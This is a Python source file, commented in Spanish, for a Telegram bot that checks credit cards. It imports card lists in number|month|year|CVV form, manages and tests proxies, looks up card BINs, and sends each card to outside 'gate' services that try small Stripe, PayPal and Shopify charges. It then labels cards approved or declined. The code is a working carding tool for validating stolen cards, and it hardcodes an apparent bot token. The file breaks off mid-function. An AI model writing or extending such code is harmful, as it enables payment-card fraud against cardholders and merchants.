import telebot
from telebot import types
import requests
import sqlite3
import json
import time
import os
import re
import random
import socket
import concurrent.futures
from datetime import datetime
from threading import Thread, Lock

# Configuración del bot - Usando variable de entorno para el token
TOKEN = os.environ.get('TOKEN', '8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE')
bot = telebot.TeleBot(TOKEN)

# Lock para operaciones de base de datos (para hilos)
db_lock = Lock()

# ==================== FUNCIONES DE BASE DE DATOS ====================

def get_db_connection():
    """Crea una nueva conexión a la base de datos"""
    conn = sqlite3.connect('proxies.db', timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    """Inicializa la base de datos con todas las tablas necesarias"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Tabla de proxies
    cursor.execute('''CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT,
        last_test TEXT,
        status TEXT DEFAULT 'untested'
    )''')
    
    # Tabla de historial
    cursor.execute('''CREATE TABLE IF NOT EXISTS historial (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT,
        proxy TEXT,
        gate TEXT,
        amount TEXT,
        status TEXT,
        message TEXT,
        gates TEXT,
        bin_info TEXT,
        fecha TEXT
    )''')
    
    # Tabla de tarjetas
    cursor.execute('''CREATE TABLE IF NOT EXISTS tarjetas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT UNIQUE,
        fecha TEXT,
        veces_verificada INTEGER DEFAULT 0
    )''')
    
    # Tabla de sitios Shopify
    cursor.execute('''CREATE TABLE IF NOT EXISTS sitios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT
    )''')
    
    # Agregar columnas si no existen
    try:
        cursor.execute("ALTER TABLE proxies ADD COLUMN last_test TEXT")
        cursor.execute("ALTER TABLE proxies ADD COLUMN status TEXT DEFAULT 'untested'")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN gate TEXT")
        cursor.execute("ALTER TABLE historial ADD COLUMN amount TEXT")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN bin_info TEXT")
    except:
        pass
    
    conn.commit()
    conn.close()
    print("✅ Base de datos configurada correctamente")

# Inicializar BD
init_database()

# Cola de tareas masivas
active_tasks = {}

# ==================== FUNCIONES DE PROXIES ====================

def guardar_proxy(proxy):
    """Guarda un proxy en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)", 
                      (proxy, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando proxy: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_proxies_desde_texto(texto):
    """Guarda proxies desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    # Patrón para identificar proxies (ip:puerto o ip:puerto:user:pass)
    patron_proxy = re.compile(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)(?::([^:]+):([^:]+))?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        # Verificar si es un proxy válido
        if patron_proxy.match(linea):
            try:
                cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_proxies():
    """Obtiene todos los proxies"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy FROM proxies")
    proxies = [row[0] for row in cursor.fetchall()]
    conn.close()
    return proxies

def obtener_proxies_con_estadisticas():
    """Obtiene proxies con sus estadísticas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy, successes, failures, last_test, status FROM proxies ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_proxy(proxy):
    """Elimina un proxy específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE proxy = ?", (proxy,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_proxies():
    """Elimina TODOS los proxies de la base de datos"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def eliminar_proxies_muertos():
    """Elimina todos los proxies marcados como 'dead'"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE status = 'dead'")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_proxy(proxy, success):
    """Actualiza estadísticas de un proxy"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE proxies SET {campo} = {campo} + 1, last_used = ? WHERE proxy = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

def actualizar_status_proxy(proxy, status, detalle):
    """Actualiza el status del proxy después del test"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE proxies SET status = ?, last_test = ? WHERE proxy = ?",
                  (status, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

# ==================== FUNCIONES DE SITIOS SHOPIFY ====================

def guardar_sitio(url):
    """Guarda un sitio Shopify en la base de datos"""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)", 
                      (url, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando sitio: {e}")
        return False
    finally:
        if conn:
            conn.close()

def guardar_sitios_desde_texto(texto):
    """Guarda sitios desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardados = 0
    repetidos = 0
    invalidos = 0
    
    # Patrón para identificar URLs de Shopify
    patron_url = re.compile(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$')
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        
        # Verificar si es una URL válida de Shopify
        if patron_url.match(linea):
            try:
                cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardados += 1
            except:
                repetidos += 1
        else:
            invalidos += 1
    
    conn.close()
    return guardados, repetidos, invalidos

def obtener_sitios():
    """Obtiene todos los sitios Shopify"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM sitios")
    sitios = [row[0] for row in cursor.fetchall()]
    conn.close()
    return sitios

def obtener_sitios_con_estadisticas():
    """Obtiene sitios con sus estadísticas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url, successes, failures, last_used FROM sitios ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_sitio(url):
    """Elimina un sitio específico"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios WHERE url = ?", (url,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_sitios():
    """Elimina TODOS los sitios de la base de datos"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_sitio(url, success):
    """Actualiza estadísticas de un sitio"""
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE sitios SET {campo} = {campo} + 1, last_used = ? WHERE url = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
    conn.commit()
    conn.close()

# ==================== FUNCIONES DE TARJETAS ====================

def guardar_tarjetas_desde_texto(texto):
    """Guarda tarjetas desde un archivo de texto"""
    lineas = texto.strip().split('\n')
    guardadas = 0
    repetidas = 0
    invalidas = 0
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for linea in lineas:
        linea = linea.strip()
        if not linea:
            continue
        partes = linea.split('|')
        if len(partes) == 4:
            try:
                cursor.execute("INSERT INTO tarjetas (cc, fecha) VALUES (?, ?)",
                              (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                conn.commit()
                guardadas += 1
            except:
                repetidas += 1
        else:
            invalidas += 1
    
    conn.close()
    return guardadas, repetidas, invalidas

def obtener_todas_tarjetas():
    """Obtiene todas las tarjetas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT cc, fecha, veces_verificada FROM tarjetas ORDER BY fecha DESC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def aumentar_contador_tarjeta(cc):
    """Aumenta el contador de verificaciones de una tarjeta"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE tarjetas SET veces_verificada = veces_verificada + 1 WHERE cc = ?",
                  (cc,))
    conn.commit()
    conn.close()

def eliminar_tarjeta(cc):
    """Elimina una tarjeta específica"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas WHERE cc = ?", (cc,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todas_tarjetas():
    """Elimina TODAS las tarjetas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def guardar_historial(cc, proxy, gate, amount, status, message, gates, bin_info):
    """Guarda una verificación en el historial"""
    if isinstance(bin_info, dict):
        bin_info_str = json.dumps(bin_info)
    else:
        bin_info_str = bin_info
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("INSERT INTO historial (cc, proxy, gate, amount, status, message, gates, bin_info, fecha) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                  (cc, proxy, gate, amount, status, message, gates, bin_info_str, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()
    
    if proxy != 'gestionado':
        actualizar_estadisticas_proxy(proxy, status == 'success')
    
    aumentar_contador_tarjeta(cc)

def obtener_estadisticas():
    """Obtiene estadísticas globales"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM proxies")
    stats_proxies = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM sitios")
    stats_sitios = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*) FROM tarjetas")
    total_tarjetas = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial")
    total_checks = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial WHERE status='success'")
    total_success = cursor.fetchone()[0]
    
    conn.close()
    
    return {
        'proxies': stats_proxies[0] or 0,
        'exits_proxy': stats_proxies[1] or 0,
        'fallos_proxy': stats_proxies[2] or 0,
        'sitios': stats_sitios[0] or 0,
        'exits_sitio': stats_sitios[1] or 0,
        'fallos_sitio': stats_sitios[2] or 0,
        'tarjetas': total_tarjetas or 0,
        'checks': total_checks or 0,
        'aprobadas': total_success or 0
    }

# ==================== MEJORA 7: BIN LOOKUP MEJORADO (MÚLTIPLES FUENTES) ====================

def obtener_bandera(codigo_pais):
    """Convierte código de país a emoji bandera"""
    banderas = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'MX': '🇲🇽', 'CA': '🇨🇦',
        'DE': '🇩🇪', 'FR': '🇫🇷', 'ES': '🇪🇸', 'IT': '🇮🇹',
        'BR': '🇧🇷', 'AR': '🇦🇷', 'CO': '🇨🇴', 'PE': '🇵🇪',
        'CL': '🇨🇱', 'VE': '🇻🇪', 'EC': '🇪🇨', 'BO': '🇧🇴',
        'UY': '🇺🇾', 'PY': '🇵🇾', 'CR': '🇨🇷', 'PA': '🇵🇦',
        'DO': '🇩🇴', 'PR': '🇵🇷', 'CU': '🇨🇺', 'GT': '🇬🇹',
        'HN': '🇭🇳', 'NI': '🇳🇮', 'SV': '🇸🇻', 'BZ': '🇧🇿',
        'JP': '🇯🇵', 'CN': '🇨🇳', 'KR': '🇰🇷', 'IN': '🇮🇳',
        'RU': '🇷🇺', 'AU': '🇦🇺', 'NZ': '🇳🇿', 'ZA': '🇿🇦'
    }
    return banderas.get(codigo_pais.upper(), '🌍')

def consultar_bin_fallback(bin_number):
    """
    Fallback con datos simulados basados en el BIN cuando las APIs no responden
    """
    bin_num = int(bin_number[:6])
    
    # Detección básica por rango
    if 400000 <= bin_num <= 499999:
        scheme = "VISA"
        tipo = "CREDIT" if bin_num > 450000 else "DEBIT"
        pais = "United States" if bin_num < 420000 else "Unknown"
        emoji = "🇺🇸" if bin_num < 420000 else "🌍"
        banco = "Visa Inc." if bin_num < 420000 else "Unknown"
    elif 510000 <= bin_num <= 559999:
        scheme = "MASTERCARD"
        tipo = "CREDIT"
        pais = "United States" if bin_num < 520000 else "Unknown"
        emoji = "🇺🇸" if bin_num < 520000 else "🌍"
        banco = "Mastercard International"
    elif 340000 <= bin_num <= 349999 or 370000 <= bin_num <= 379999:
        scheme = "AMEX"
        tipo = "CREDIT"
        pais = "United States"
        emoji = "🇺🇸"
        banco = "American Express"
    elif 601100 <= bin_num <= 601199:
        scheme = "DISCOVER"
        tipo = "CREDIT"
        pais = "United States"
        emoji = "🇺🇸"
        banco = "Discover Financial"
    else:
        scheme = "UNKNOWN"
        tipo = "UNKNOWN"
        pais = "Unknown"
        emoji = "🌍"
        banco = "Unknown"
    
    return {
        'scheme': scheme,
        'type': tipo,
        'country': {
            'name': pais,
            'emoji': emoji
        },
        'bank': {
            'name': banco
        },
        'source': 'fallback'
    }

def consultar_bin(bin_number):
    """
    Consulta información de BIN usando múltiples fuentes para máxima cobertura
    Incluye datos de bancos, países, tipos de tarjeta y productos específicos
    """
    bin_number = bin_number[:6]
    
    # Fuentes en orden de preferencia (más confiables primero)
    fuentes = [
        {
            'name': 'bincheck.io',
            'url': f"https://lookup.bincheck.io/api/v2/{bin_number}",
            'parser': lambda d: {
                'scheme': d.get('scheme', 'UNKNOWN').upper(),
                'type': d.get('type', 'UNKNOWN').upper(),
                'brand': d.get('brand', ''),
                'country': {
                    'name': d.get('country', {}).get('name', 'Unknown'),
                    'emoji': d.get('country', {}).get('emoji', '🌍'),
                    'code': d.get('country', {}).get('code', '')
                },
                'bank': {
                    'name': d.get('bank', {}).get('name', 'Unknown'),
                    'url': d.get('bank', {}).get('url', ''),
                    'phone': d.get('bank', {}).get('phone', ''),
                    'city': d.get('bank', {}).get('city', '')
                },
                'product': d.get('product', ''),
                'prepaid': d.get('prepaid', False),
                'source': 'bincheck.io'
            }
        },
        {
            'name': 'iinapi.com',
            'url': f"https://iinapi.com/api/{bin_number}",
            'parser': lambda d: {
                'scheme': d.get('card_scheme', 'UNKNOWN').upper(),
                'type': d.get('card_type', 'UNKNOWN').upper(),
                'brand': d.get('brand', ''),
                'country': {
                    'name': d.get('country', 'Unknown'),
                    'emoji': obtener_bandera(d.get('country_code', '')),
                    'code': d.get('country_code', '')
                },
                'bank': {
                    'name': d.get('bank', 'Unknown'),
                    'url': d.get('bank_url', ''),
                    'phone': d.get('bank_phone', '')
                },
                'product': d.get('product', ''),
                'prepaid': d.get('prepaid', False),
                'source': 'iinapi.com'
            }
        },
        {
            'name': 'binlist.net',
            'url': f"https://lookup.binlist.net/{bin_number}",
            'parser': lambda d: {
                'scheme': d.get('scheme', 'UNKNOWN').upper(),
                'type': d.get('type', 'UNKNOWN').upper(),
                'brand': d.get('brand', ''),
                'country': {
                    'name': d.get('country', {}).get('name', 'Unknown'),
                    'emoji': d.get('country', {}).get('emoji', '🌍'),
                    'code': d.get('country', {}).get('alpha2', '')
                },
                'bank': {
                    'name': d.get('bank', {}).get('name', 'Unknown'),
                    'url': d.get('bank', {}).get('url', ''),
                    'phone': d.get('bank', {}).get('phone', ''),
                    'city': d.get('bank', {}).get('city', '')
                },
                'product': d.get('product', ''),
                'prepaid': d.get('prepaid', False),
                'source': 'binlist.net'
            }
        }
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    
    for fuente in fuentes:
        try:
            print(f"🔍 Consultando {fuente['name']} para BIN {bin_number}...")
            response = requests.get(fuente['url'], headers=headers, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                if data and not data.get('error'):
                    return fuente['parser'](data)
            elif response.status_code == 429:
                time.sleep(1)  # Rate limit, esperar y continuar
                continue
                
        except Exception as e:
            print(f"⚠️ Error con {fuente['name']}: {e}")
            continue
    
    # Si todas fallan, usar fallback
    print(f"⚠️ Usando fallback para BIN {bin_number}")
    return consultar_bin_fallback(bin_number)

# ==================== MEJORA 2: TEST DE PROXY AVANZADO ====================

def test_proxy_socket(proxy, timeout=3):
    """
    Test básico de conectividad usando socket
    Más rápido y confiable que solo HTTP
    """
    try:
        partes = proxy.split(':')
        if len(partes) == 4:
            ip, puerto, user, passw = partes
        elif len(partes) == 2:
            ip, puerto = partes
        else:
            return False, "Formato inválido"
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, int(puerto)))
        sock.close()
        
        if result == 0:
            return True, f"✅ Socket OK"
        else:
            return False, f"❌ Socket error {result}"
            
    except Exception as e:
        return False, f"❌ {str(e)}"

def test_proxy_http(proxy, timeout=5):
    """
    Test HTTP con múltiples endpoints para mayor precisión
    """
    endpoints = [
        {"url": "https://httpbin.org/ip", "name": "HTTPBin", "ssl": True},
        {"url": "http://ip-api.com/json", "name": "IP-API", "ssl": False},
        {"url": "https://api.ipify.org?format=json", "name": "IPify", "ssl": True},
        {"url": "http://checkip.amazonaws.com", "name": "AWS Check", "ssl": False}
    ]
    
    try:
        partes = proxy.split(':')
        if len(partes) == 4:
            ip, puerto, user, passw = partes
            proxy_dict = {
                'http': f'http://{user}:{passw}@{ip}:{puerto}',
                'https': f'https://{user}:{passw}@{ip}:{puerto}'
            }
        elif len(partes) == 2:
            ip, puerto = partes
            proxy_dict = {
                'http': f'http://{ip}:{puerto}',
                'https': f'https://{ip}:{puerto}'
            }
        else:
            return False, "Formato inválido", 0
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Probar cada endpoint hasta encontrar uno que funcione
        for endpoint in endpoints:
            try:
                start_time = time.time()
                response = requests.get(
                    endpoint['url'], 
                    proxies=proxy_dict, 
                    headers=headers, 
                    timeout=timeout,
                    verify=False  # Ignorar SSL para pruebas
                )
                elapsed = time.time() - start_time
                
                if response.status_code == 200:
                    return True, endpoint['name'], elapsed
            except:
                continue
        
        return False, "Todos los endpoints fallaron", 0
        
    except Exception as e:
        return False, str(e), 0

@bot.message_handler(commands=['testproxy'])
def cmd_test_proxies_avanzado(message):
    """Test avanzado de proxies con socket + HTTP"""
    
    proxies = obtener_proxies()
    
    if not proxies:
        bot.reply_to(message, "📭 No hay proxies guardados")
        return
    
    msg = bot.reply_to(message, f"🔬 Iniciando test avanzado de {len(proxies)} proxies...")
    
    resultados = {
        'excelente': [],  # Socket OK + HTTP < 2s
        'bueno': [],      # Socket OK + HTTP < 5s
        'lento': [],      # Socket OK + HTTP > 5s
        'parcial': [],    # Socket OK pero HTTP falla
        'muerto': []      # Socket falla
    }
    
    for i, proxy in enumerate(proxies, 1):
        # Actualizar progreso
        if i % 3 == 0 or i == len(proxies):
            try:
                bot.edit_message_text(
                    f"🔬 Testeando proxy {i}/{len(proxies)}...",
                    message.chat.id,
                    msg.message_id
                )
            except:
                pass
        
        # 1. Test de socket primero (rápido)
        socket_ok, socket_msg = test_proxy_socket(proxy)
        
        if not socket_ok:
            resultados['muerto'].append((proxy, socket_msg))
            actualizar_status_proxy(proxy, 'muerto', socket_msg)
            continue
        
        # 2. Si socket funciona, test HTTP
        http_ok, http_source, tiempo = test_proxy_http(proxy)
        
        if http_ok:
            if tiempo < 2:
                resultados['excelente'].append((proxy, f"{tiempo:.2f}s via {http_source}"))
                actualizar_status_proxy(proxy, 'excelente', f"{tiempo:.2f}s")
            elif tiempo < 5:
                resultados['bueno'].append((proxy, f"{tiempo:.2f}s via {http_source}"))
                actualizar_status_proxy(proxy, 'bueno', f"{tiempo:.2f}s")
            else:
                resultados['lento'].append((proxy, f"{tiempo:.2f}s via {http_source}"))
                actualizar_status_proxy(proxy, 'lento', f"{tiempo:.2f}s")
        else:
            resultados['parcial'].append((proxy, "HTTP falla (solo socket OK)"))
            actualizar_status_proxy(proxy, 'parcial', "HTTP fail")
    
    # Generar resumen
    texto = f"""🔬 TEST AVANZADO DE PROXIES
━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 RESULTADOS:

✅ Excelentes (<2s): {len(resultados['excelente'])}
👍 Buenos (2-5s): {len(resultados['bueno'])}
🐢 Lentos (>5s): {len(resultados['lento'])}
⚠️ Parciales (solo socket): {len(resultados['parcial'])}
❌ Muertos: {len(resultados['muerto'])}

📁 Se generó archivo con detalles
💡 Usa /px para test rápido"""
    
    # Generar archivo detallado
    filename = f"proxy_test_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("🔬 TEST AVANZADO DE PROXIES\n")
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total proxies: {len(proxies)}\n\n")
        
        for cat, items in [('EXCELENTES', resultados['excelente']),
                          ('BUENOS', resultados['bueno']),
                          ('LENTOS', resultados['lento']),
                          ('PARCIALES', resultados['parcial']),
                          ('MUERTOS', resultados['muerto'])]:
            if items:
                f.write(f"\n{cat} ({len(items)}):\n")
                for proxy, detalle in items:
                    f.write(f"  • {proxy}\n")
                    f.write(f"    └ {detalle}\n")
    
    try:
        bot.edit_message_text(texto, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, texto)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f, caption="📊 Test avanzado de proxies")
    
    os.remove(filename)

@bot.message_handler(commands=['px'])
def cmd_test_proxies_rapido(message):
    """Test rápido (compatibilidad)"""
    
    proxies = obtener_proxies()
    
    if not proxies:
        bot.reply_to(message, "📭 No hay proxies guardados")
        return
    
    msg = bot.reply_to(message, f"🔄 Test rápido de {len(proxies)} proxies...")
    
    vivos = 0
    muertos = 0
    
    for i, proxy in enumerate(proxies, 1):
        if i % 5 == 0:
            try:
                bot.edit_message_text(f"🔄 Testeando... {i}/{len(proxies)}", message.chat.id, msg.message_id)
            except:
                pass
        
        socket_ok, _ = test_proxy_socket(proxy)
        if socket_ok:
            vivos += 1
        else:
            muertos += 1
    
    texto = f"""✅ TEST RÁPIDO COMPLETADO
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:

✅ Vivos (socket): {vivos}
❌ Muertos: {muertos}

💡 Usa /testproxy para análisis detallado"""
    
    try:
        bot.edit_message_text(texto, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, texto)

# ==================== FUNCIONES DE VERIFICACIÓN STRIPE $1 ====================

def verificar_api_stripe(cc, proxy=None):
    """
    Verifica usando Stripe (endpoint /api/check3) - $1.00
    """
    try:
        api_url = f"https://samurai-api-hub.up.railway.app/api/check3?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates = data.get('gates', 'stripe 1.00$ charged')
            amount = data.get('amount', '1.00')
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates,
                'gate_name': 'Stripe $1.00',
                'amount': amount,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'stripe error',
                'gate_name': 'Stripe $1.00',
                'amount': '1.00',
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'stripe error',
            'gate_name': 'Stripe $1.00',
            'amount': '1.00',
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIONES DE VERIFICACIÓN PAYPAL ====================

def verificar_api_paypal(cc, gate=1, proxy=None):
    """
    Verifica usando PayPal con diferentes montos
    gate 1: /pp/check  - $10.00
    gate 2: /pp/check2 - $0.10
    gate 3: /pp/check3 - $1.00
    """
    gates = {
        1: {"endpoint": "/pp/check", "amount": "10.00", "name": "PayPal $10"},
        2: {"endpoint": "/pp/check2", "amount": "0.10", "name": "PayPal $0.10"},
        3: {"endpoint": "/pp/check3", "amount": "1.00", "name": "PayPal $1"}
    }
    
    gate_info = gates.get(gate, gates[1])
    
    try:
        api_url = f"https://samurai-api-hub.up.railway.app{gate_info['endpoint']}?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates_str = f"paypal {gate_info['amount']}$ charged"
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates_str,
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'paypal error',
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'paypal error',
            'gate_name': gate_info['name'],
            'amount': gate_info['amount'],
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY ====================

def verificar_api_autoshopify(cc, url, proxy=None):
    """
    Verifica usando AutoShopify (endpoint shopi.php)
    """
    try:
        api_url = f"http://dev-kamal.pw/shopi.php?cc={cc}&url={url}"
        if proxy:
            api_url += f"&proxy={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            response_text = data.get('Response', 'Unknown')
            price = data.get('Price', '0.00')
            gate = data.get('Gate', 'Shopify')
            
            # Determinar si es éxito
            is_success = 'Order completed' in response_text
            
            return {
                'success': is_success,
                'status': 'success' if is_success else 'failed',
                'message': response_text,
                'gates': f"Shopify ${price}",
                'gate_name': f"AutoShopify ${price}",
                'amount': price,
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code} - {response.text[:100]}',
                'gates': 'shopify error',
                'gate_name': 'AutoShopify',
                'amount': '0.00',
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'shopify error',
            'gate_name': 'AutoShopify',
            'amount': '0.00',
            'url': url,
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FORMATO PREMIUM PARA RESULTADOS ====================

def formato_check_premium(cc, resultado_api, bin_info, tiempo, user_name="User", gate_type="Stripe"):
    """
    Formato premium con diseño tipo checker profesional
    """
    # Determinar estado de la verificación
    if resultado_api['status'] == 'success':
        estado_verif = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
        color_estado = "✅"
    elif resultado_api['status'] == 'failed':
        estado_verif = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        color_estado = "❌"
    elif resultado_api['status'] == 'error':
        estado_verif = "𝐄𝐫𝐫𝐨𝐫 ⚠️"
        color_estado = "⚠️"
    else:
        estado_verif = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧 ❓"
        color_estado = "❓"
    
    # Extraer datos de la tarjeta
    partes = cc.split('|')
    numero = partes[0]
    mes = partes[1]
    año = partes[2]
    cvv = partes[3]
    bin_num = numero[:6]
    
    # Extraer información del BIN (ahora con más datos)
    if bin_info and isinstance(bin_info, dict) and 'error' not in bin_info:
        scheme = bin_info.get('scheme', 'UNKNOWN').upper()
        card_type = bin_info.get('type', 'UNKNOWN').upper()
        
        # Datos del país
        country_info = bin_info.get('country', {})
        country_name = country_info.get('name', 'Unknown')
        country_emoji = country_info.get('emoji', '🌍')
        
        # Datos del banco
        bank_info = bin_info.get('bank', {})
